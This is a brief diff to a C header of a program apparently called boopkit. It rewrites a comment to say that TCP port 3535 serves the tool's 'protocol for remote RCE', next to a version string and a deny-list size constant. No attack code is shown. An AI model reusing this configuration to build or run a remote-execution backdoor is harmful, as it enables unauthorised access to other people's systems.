@@ -41,7 +41,7 @@ struct tcp_return {
 // VERSION is the semantic version of the program
 #define VERSION "1.0.3"
 
-// PORT must match the ${SRC_PORT} in the /boop script!
+// PORT for the boopkit TCP protocol for remote RCE
 #define PORT 3535
 
 // MAX_DENY_ADDRS is the maximum amount of address that can be denied.
